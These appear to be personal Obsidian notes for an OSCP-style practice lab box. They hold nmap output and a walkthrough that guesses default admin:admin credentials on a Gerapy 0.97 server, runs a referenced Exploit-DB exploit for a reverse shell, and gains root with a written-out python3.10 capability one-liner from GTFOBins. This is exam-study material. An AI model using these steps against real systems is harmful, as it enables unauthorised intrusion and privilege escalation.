IP::   192.168.113.24

| Machine | IP Address | Notes |
| ------- | ---------- | ----- |
|         |            |       |

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
KALI IP::  192.168.45.189
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `${KaliIP}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Discovered Web Domain::   192.168.113.24:8000
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
[[Editing Page]]

wget from local python server
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```
## Provided Credentials
---

```

```

```

```

---
## Software Versions

http://192.168.113.24:8000/ [200 OK] Allow[GET, OPTIONS], Country[RESERVED][ZZ], HTML5, HTTPServer[WSGIServer/0.2 CPython/3.10.6], IP[192.168.113.24], Script, Title[Gerapy], X-UA-Compatible[IE=edge]




---



## Open Ports
---
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

---

## Discovered Subdomains
---
http://192.168.113.24:8000/admin

Django Administrator admin:admin

---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```

http://ip:8000/ shows gerapy website

guess creds admin:admin works

gerapy 0.97 found

https://www.exploit-db.com/exploits/50640 used

Reverse shell achieved. 

local.txt found in cd ~

---

linpeas shows python3.10 capabilities allowed

which python3.10

from gtfobins,  /usr/bin/python3.10 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")' gives root

/bin/bash -i

cd /root

cat proof.txt